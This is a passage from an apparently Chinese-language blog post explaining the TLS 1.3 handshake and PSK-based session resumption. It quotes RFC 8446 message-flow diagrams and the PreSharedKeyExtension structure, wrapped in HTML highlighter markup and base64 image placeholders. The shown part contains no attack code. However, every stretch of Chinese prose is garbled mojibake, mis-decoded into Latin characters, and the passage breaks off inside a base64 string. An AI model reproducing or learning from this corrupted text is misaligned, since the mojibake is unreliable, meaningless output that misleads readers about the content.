åœ¨å›å¤ Server Hello æ—¶ï¼ŒæœåŠ¡å™¨å›å¤å®ƒæ‰€é€‰æ‹©çš„å¯†é’¥åè®®åè®®ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬æœåŠ¡å™¨çš„å¯†é’¥å…±äº«ã€è¯ä¹¦ä»¥åŠ Server Finished ã€‚</li><li>ç°åœ¨ï¼Œå®¢æˆ·ç«¯æ£€æŸ¥æœåŠ¡å™¨è¯ä¹¦ï¼Œç”Ÿæˆå¯†é’¥ï¼Œå¹¶å‘é€ Client Finished ï¼Œä¹‹åå°±å¯ä»¥å‘é€åŠ å¯†æ•°æ®äº†ã€‚</li></ol><p>è¿™æ ·ä¸€æ¥ï¼ŒTLS 1.3 æ¡æ‰‹å°±èŠ‚çœäº†æ•´æ•´ä¸€ä¸ªæ¥å›å’Œæ•°ç™¾æ¯«ç§’çš„æ—¶é—´ï¼Œæ¯” TLS 1.2 æ¡æ‰‹æœ‰äº†å¾ˆå¤§çš„æ”¹è¿›ã€‚RFC 8446 æä¾›çš„ç®€è¦æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                          Server</span><br><span class="line"></span><br><span class="line">Key  ^ ClientHello</span><br><span class="line">Exch | + key_share*</span><br><span class="line">     | + signature_algorithms*</span><br><span class="line">     | + psk_key_exchange_modes*</span><br><span class="line">     v + pre_shared_key*       --------&gt;</span><br><span class="line">                                                  ServerHello  ^ Key</span><br><span class="line">                                                 + key_share*  | Exch</span><br><span class="line">                                            + pre_shared_key*  v</span><br><span class="line">                                        {EncryptedExtensions}  ^  Server</span><br><span class="line">                                        {CertificateRequest*}  v  Params</span><br><span class="line">                                               {Certificate*}  ^</span><br><span class="line">                                         {CertificateVerify*}  | Auth</span><br><span class="line">                                                   {Finished}  v</span><br><span class="line">                               &lt;--------  [Application Data*]</span><br><span class="line">     ^ {Certificate*}</span><br><span class="line">Auth | {CertificateVerify*}</span><br><span class="line">     v {Finished}              --------&gt;</span><br><span class="line">       [Application Data]      &lt;-------&gt;  [Application Data]</span><br><span class="line"></span><br><span class="line">              +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">                 previously noted message.</span><br><span class="line"></span><br><span class="line">              *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">                 messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">              {} Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">              [] Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">               Figure 1: Message Flow <span class="hljs-keyword">for</span> Full TLS Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>TLS 1.2 ä¸ 1.3 ç®€è¦çš„æ¡æ‰‹å¯¹æ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/7.png" alt=""></p><h4 id="TLS-1-3-Session-Resumption-PSK"><a href="#TLS-1-3-Session-Resumption-PSK" class="headerlink" title="TLS 1.3 Session Resumption - PSK"></a>TLS 1.3 Session Resumption - PSK</h4><p>æŒ‰ç…§ä¸Šæ–‡æ‰€è¯´ï¼ŒTLS 1.3 ç”¨é€šè¿‡é¢„å…±äº«å¯†é’¥ï¼ˆPre-Shared Key, PSKï¼‰æ¢å¤ä¼šè¯çš„æ¦‚å¿µå–ä»£äº† 1.2 å½“ä¸­çš„ Session ID å’Œ Session Ticket ã€‚åœ¨æœ€åˆçš„æ¡æ‰‹ä¹‹åï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª PSK æ ‡è¯†ã€‚ PSK å†…å®¹å–å†³äºæœåŠ¡å™¨ï¼Œå¯èƒ½åŒ…å«ä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢å¯†é’¥æˆ–ä¸€ä¸ªè‡ªæˆ‘åŠ å¯†å’Œè‡ªæˆ‘è®¤è¯çš„ç¥¨æ®ã€‚å®¢æˆ·ç«¯å°†æ­¤PSKèº«ä»½ä¸è‡ªå·±çš„ä¼šè¯å¯†é’¥ä¸€èµ·å­˜å‚¨ã€‚å…¶ä¸­ï¼Œ RFC 8446 å®šä¹‰çš„ PSK ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">    opaque identity&lt;<span class="hljs-number">1.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    <span class="hljs-built_in">uint</span>32 obfuscated_ticket_age;</span><br><span class="line">} PskIdentity;</span><br><span class="line"></span><br><span class="line">opaque PskBinderEntry&lt;<span class="hljs-number">32.</span><span class="hljs-number">.255</span>&gt;;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    PskIdentity identities&lt;<span class="hljs-number">7.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    PskBinderEntry binders&lt;<span class="hljs-number">33.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} OfferedPsks;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    select (Handshake.msg_type) {</span><br><span class="line">        <span class="hljs-keyword">case</span> client_hello: OfferedPsks;</span><br><span class="line">        <span class="hljs-keyword">case</span> server_hello: <span class="hljs-built_in">uint</span>16 selected_identity;</span><br><span class="line">    };</span><br><span class="line">} PreSharedKeyExtension;</span><br></pre></td></tr></tbody></table></figure><p></p><p>åœ¨éšåçš„æ¡æ‰‹ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨ç»™æœåŠ¡å™¨çš„ ClientHello æ¶ˆæ¯ä¸­æä¾›è¿™ä¸ª PSK ï¼ŒæœåŠ¡å™¨æ ¹æ® PSK çš„å†…å®¹å¯¹ç¥¨æ®è¿›è¡Œè§£å¯†ï¼Œå¹¶ä½¿ç”¨åŒ…å«çš„ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€æ¥æ¢å¤ä¼šè¯ï¼Œæˆ–è€…æœåŠ¡å™¨ä½¿ç”¨åŒ…å«çš„æŸ¥æ‰¾å¯†é’¥åœ¨è‡ªå·±çš„æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€ã€‚ RFC 8446 æä¾›äº†ä¸€ä¸ª Session Resumption çš„æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">Initial Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share               --------&gt;</span><br><span class="line">                                                       ServerHello</span><br><span class="line">                                                       + key_share</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                             {CertificateRequest*}</span><br><span class="line">                                                    {Certificate*}</span><br><span class="line">                                              {CertificateVerify*}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Certificate*}</span><br><span class="line">       {CertificateVerify*}</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">                                 &lt;--------      [NewSessionTicket]</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subsequent Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share*</span><br><span class="line">       + pre_shared_key          --------&gt;</span><br><span class="line">                                                       ServerHello</span><br><span class="line">                                                  + pre_shared_key</span><br><span class="line">                                                      + key_share*</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line">            Figure 3: Message Flow <span class="hljs-keyword">for</span> Resumption <span class="hljs-keyword">and</span> PSK</span><br></pre></td></tr></tbody></table></figure><p></p><ol><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªå¸¦æœ‰ key_share æ‰©å±•çš„ ClientHello æ¶ˆæ¯ã€‚è¯¥æ‰©å±•åˆ—å‡ºäº†å®¢æˆ·ç«¯æ”¯æŒçš„å¯†é’¥äº¤æ¢åŠ å¯†æ–¹æ³•ã€‚</li><li>æœåŠ¡å™¨ç”¨ä¸€ä¸ªå¸¦æœ‰ key_share æ‰©å±•åçš„ ServerHello æ¶ˆæ¯è¿›è¡Œå“åº”ï¼Œè¿™ä¸ªæ‰©å±•åŒ…å«äº†å®ƒè¦ç”¨äºå¯†é’¥äº¤æ¢çš„åŠ å¯†æ–¹æ³•ï¼Œå¹¶ä¸”æœåŠ¡å™¨å°†å…¶å‚æ•°ä¸€åŒå‘é€ç»™å®¢æˆ·ç«¯ã€‚</li><li>æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½äº¤æ¢è®¤è¯æ¶ˆæ¯ã€‚</li><li>æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ NewSessionTicket æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª PSK ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡åœ¨ ClientHello æ¶ˆæ¯çš„ pre_shared_key æ‰©å±•ä¸­åŒ…å«è¿™ä¸ª PSK ï¼Œç”¨äºæœªæ¥çš„æ¡æ‰‹ã€‚</li><li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç°åœ¨å¯ä»¥äº¤æ¢åŠ å¯†çš„åº”ç”¨æ•°æ®ã€‚</li><li>åœ¨æœªæ¥çš„æ¡æ‰‹ä¸­ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåŒ…å« key_share å’Œ pre_shared_key æ‰©å±•åçš„ ClientHello æ¶ˆæ¯ã€‚ pre_shared_key æ‰©å±•åŒ…å« NewTicketSession æ¶ˆæ¯ä¸­å‘é€çš„ PSK ã€‚</li><li>æœåŠ¡å™¨ç”¨åŒ…å« pre_shared_key å’Œ key_share æ‰©å±•åçš„ ServerHello æ¶ˆæ¯ä½œå‡ºå“åº”ã€‚ pre_shared_key æ‰©å±•åŒ…å«æœåŠ¡å™¨åŒæ„ä½¿ç”¨çš„ PSK ï¼Œå¹¶å°†å…¶å‚æ•°å‘é€ç»™å®¢æˆ·ç«¯ã€‚</li><li>æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯äº’ç›¸å‘é€ Finished æ¶ˆæ¯ï¼Œä¹‹åå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥äº¤æ¢åŠ å¯†çš„åº”ç”¨æ•°æ®ã€‚</li></ol><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç›´è§‚æ„Ÿå—ä¸€ä¸‹ TLS 1.3 åŸºäº PSK çš„æ¡æ‰‹è¿‡ç¨‹ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/1.png" alt=""></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒClient ç¬¬ä¸€æ¬¡ä¸ Server æ¡æ‰‹å‘é€ Client Hello æ¶ˆæ¯æ—¶ï¼ŒåªåŒ…å«äº† key_share æ‹“å±•ï¼ŒServer ä¹Ÿåšå‡ºå“åº”çš„å›åº”ï¼Œä½¿ç”¨åŒ…å« key_share æ‹“å±•çš„æ¶ˆæ¯è¿›è¡Œå›åº”ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/2.png" alt=""></p><p>Client åœ¨ç¬¬äºŒæ¬¡å‘é€ Client Hello æ¶ˆæ¯æ—¶ï¼Œå¸¦ä¸Šäº†ä¹‹å‰ Server åœ¨ NewSessionTicket å‘é€çš„ pre_shared_key ï¼Œå°†å…¶ä½œä¸ºæ‹“å±•å‘é€è‡³ Server ï¼Œéšå Server å“åº” Server Hello æ¶ˆæ¯æ—¶ï¼Œä¹Ÿä½¿ç”¨ pre_shared_key ä½œä¸ºæ‹“å±•å“åº”ï¼Œè¿™æ ·å°±å®Œæˆäº†åŸºäº PSK çš„ Session Resumption </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuu